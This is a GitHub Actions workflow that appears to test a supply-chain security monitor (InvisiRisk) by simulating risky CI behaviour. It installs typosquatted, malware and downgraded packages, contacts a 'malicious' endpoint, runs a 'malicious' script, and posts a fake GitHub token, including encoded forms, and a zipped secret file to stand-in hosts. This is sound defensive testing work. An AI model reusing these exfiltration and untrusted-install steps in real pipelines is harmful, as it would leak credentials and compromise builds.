name: Python application
on:
  workflow_dispatch:

permissions:
  checks: write
  contents: write
  packages: read

jobs:
  python-application-build:
    runs-on: ubuntu-latest
    name: Run build
    steps:
      # - name: Install Git v2.50.1
      #   run: |
      #     # Install build dependencies for Git
      #     sudo apt-get update
      #     sudo apt-get install -y make libssl-dev libghc-zlib-dev libcurl4-gnutls-dev libexpat1-dev gettext wget
          
      #     # Download, compile, and install Git v2.50.1
      #     wget https://github.com/git/git/archive/refs/tags/v2.50.1.tar.gz -O git.tar.gz
      #     tar -xzf git.tar.gz
      #     cd git-2.50.1
      #     make prefix=/usr/local all
      #     sudo make prefix=/usr/local install
          
      # - name: Verify Git Version
      #   run: git --version
         
      # ============= InvisiRisk Setup =============
      - name: Setup PSE
        uses: invisirisk/pse-action@latest
        with:
          api_url: "https://app.invisirisk.com"
          #api_url: "https://app.stage.invisirisk.com"
          app_token: ${{ secrets.IR_API_KEY }}
          mode: "docker-intercept"
      # ============= InvisiRisk Setup End =============
      - uses: actions/checkout@v4

      - name: Use Python
        uses: actions/setup-python@v4
        with:
          python-version: "3.9"

      # =============================
      # Docker / Base Setup
      # =============================
      - name: Pull Docker image
        run: docker pull testcontainers/ryuk:0.12.0

      # =============================
      # Supply Chain Attacks
      # =============================
      - name: Install downgraded package
        continue-on-error: true
        run: pip install requests==2.31.0

      - name: Install from unexpected source
        continue-on-error: true
        run: pip install numpy==1.9.3 --no-deps --index-url https://test.pypi.org/simple/

      - name: Install typosquatted package
        continue-on-error: true
        run: curl -k -O https://files.pythonhosted.org/packages/.../requestss.whl.metadata

      - name: Install malware package
        continue-on-error: true
        run: curl -k -O https://files.pythonhosted.org/packages/.../abilityrequests.whl.metadata

      - name: Install KEV package
        continue-on-error: true
        run: curl -k -O https://files.pythonhosted.org/packages/.../salt-2015.8.0rc1.whl.metadata

      - name: Install with different checksum
        continue-on-error: true
        run: pip install --no-cache-dir --no-deps boto3==1.4.0 --index-url https://test.pypi.org/simple/

      # =============================
      # Network / Endpoint Behavior
      # =============================
      - name: Contact new endpoint
        continue-on-error: true
        run: curl http://example.com/test

      - name: Contact malicious endpoint
        continue-on-error: true
        run: curl https://malicious.com/

      - name: Make cURL request
        run: curl https://package-registry.free.beeceptor.com/packages

      - name: Dummy PUT request
        run: curl -X PUT https://httpbin.org/put

      - name: Unauthorized PUT request
        run: curl -X PUT https://example.com/api/resource

      - name: POST request
        run: |
          curl -X POST https://example.com/api \
            -H "Content-Type: application/json" \
            -d '{"key1":"value1"}'

      - name: New host request
        run: curl https://www.google.com

      - name: Blacklisted URL
        run: curl -k https://cdn.jsdelivr.net/gh/Fabriziovigna11/mn-authz-x7/s5-r9

      # =============================
      # File + System Behavior
      # =============================
      - name: Run unusual command
        continue-on-error: true
        run: wget https://www.w3.org/TR/PNG/iso_8859-1.txt

      - name: Create unexpected file
        continue-on-error: true
        run: echo "Suspicious content" > suspicious.txt

      - name: Execute malicious script
        run: bash run_malicious_scripts.sh

      # =============================
      # Secret Leak Simulations
      # =============================
      - name: Direct secret leak
        run: |
          curl -X POST https://vbirmock.free.beeceptor.com/hack \
            -H "Content-Type: application/json" \
            -d '{"GH":"ghp_TESTTOKEN"}'

      - name: Secret in query param
        run: |
          curl "https://example.com/data?api_key=ghp_TESTTOKEN"

      - name: Base64 encoded secret
        run: |
          curl -X POST https://base64encodedsecrets.com \
            -H "Content-Type: application/json" \
            -d '{"data":{"GH":"VGVzdFNlY3JldA=="}}'

      - name: Hex encoded secret
        run: |
          curl -X POST https://hexencodedsecrets.com \
            -H "Content-Type: application/json" \
            -d '{"data":{"GH":"74657374736563726574"}}'

      - name: Multi-encoded secret
        run: |
          curl -X POST https://HEXtoBase64toHEX.com \
            -H "Content-Type: application/json" \
            -d '{"data":{"GH":"54657374536563726574"}}'

      # =============================
      # File Exfiltration Simulation
      # =============================
      - name: Create file with secret
        run: |
          echo '{"GH":"ghp_TESTTOKEN"}' > dummy.txt
          zip leaks.zip dummy.txt

      - name: Upload file
        run: |
          curl -X POST https://archivedSecrets.com \
            -F "file=@leaks.zip"

      # =============================
      # Response-based Policies
      # =============================
      - name: Trigger 400 response
        run: curl -k -X POST https://api.github.com/endpoint

      - name: Mime type test
        run: curl -s -L https://tinyurl.com/invisirisk

      - name: Large file download
        run: curl -o 1GB.bin https://nbg1-speed.hetzner.com/1GB.bin

      - name: Response with secrets
        run: curl -k https://pastebin.com/raw/V4FrgKcm

      - name: Install dependencies
        run: pip install -r requirements.txt

      # ============= InvisiRisk Cleanup =============
      - name: Cleanup PSE
        if: always()
        uses: invisirisk/pse-action@latest
        with:
          cleanup: "true"
      # ============= InvisiRisk Cleanup End =============

  gather_analytics:
    runs-on: ubuntu-latest
    name: Gather Analytics
    needs: python-application-build
    if: always()
    steps:
      - name: Gather Status
        uses: invisirisk/pse-action@latest
        with:
          api_url: "https://app.invisirisk.com"
          #api_url: "https://app.stage.invisirisk.com"
          app_token: ${{ secrets.IR_API_KEY }}
          send_job_status: "true"
          debug: "true"
